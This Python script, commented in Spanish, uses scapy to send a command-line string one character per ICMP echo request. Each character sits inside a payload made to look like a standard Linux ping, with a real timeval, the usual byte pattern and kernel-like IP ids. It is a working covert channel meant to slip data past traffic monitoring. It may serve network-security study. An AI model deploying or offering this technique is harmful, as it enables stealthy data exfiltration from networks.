import os
import random
import socket
import struct
import sys
import time

from scapy.all import IP, ICMP, send

DST = "google.com"         # cambiar por destino real segun necesidad
PAYLOAD_LEN = 56           # bytes totales: 16 timeval + 40 patron (Linux 64 bits)
TIMEVAL_LEN = 16           # 8 bytes tv_sec + 8 bytes tv_usec
PATTERN_START = 0x10
PATTERN_END = 0x37


def build_timeval():
    ahora = time.time()
    segundos = int(ahora)
    microsegundos = int((ahora - segundos) * 1_000_000)
    return struct.pack("=qq", segundos, microsegundos)


def build_payload(char):
    patron = bytes(range(PATTERN_START, PATTERN_END + 1))  # 40 bytes: 0x10..0x37
    timeval = build_timeval()                                # 16 bytes reales/variables
    cuerpo = bytes([ord(char)]) + patron[1:]                 # char reemplaza el 1er 0x10
    data = timeval + cuerpo
    return data[:PAYLOAD_LEN]


def hexdump(data):
    for offset in range(0, len(data), 16):
        fila = data[offset:offset + 16]
        hexs = " ".join(f"{b:02x}" for b in fila)
        ascii_repr = "".join(chr(b) if 32 <= b < 127 else "." for b in fila)
        print(f"{offset:04x}  {hexs:<47}  {ascii_repr}")


def main():
    if os.geteuid() != 0:
        sys.exit("Requiere privilegios de root (usa sudo).")

    texto = sys.argv[1]
    ident = os.getpid() & 0xFFFF

    # Resolver el hostname UNA sola vez (como hace un ping real) y reutilizar
    # la misma IP para todos los paquetes de la sesion, evitando que el
    # round-robin DNS mande cada caracter a un destino distinto.
    dst_ip = socket.gethostbyname(DST)
    print(f"[DEBUG] {DST} resuelto a {dst_ip} (fijo para toda la sesion)")

    # IP id: base pseudoaleatoria (simula asignacion del kernel), no arranca en 1.
    ip_id_base = random.randint(0x1000, 0xFFFF - len(texto) - 1)

    print(f"[DEBUG] payload de ejemplo ({PAYLOAD_LEN} bytes), caracter '{texto[0]}':")
    hexdump(build_payload(texto[0]))
    print()

    for i, char in enumerate(texto, start=1):
        payload = build_payload(char)
        ip_id = (ip_id_base + i - 1) & 0xFFFF
        pkt = (
            IP(dst=dst_ip, id=ip_id, flags="DF")
            / ICMP(type=8, code=0, id=ident, seq=i)
            / payload
        )
        send(pkt, verbose=False)
        print("Sent 1 packets.")


if __name__ == "__main__":
    main()
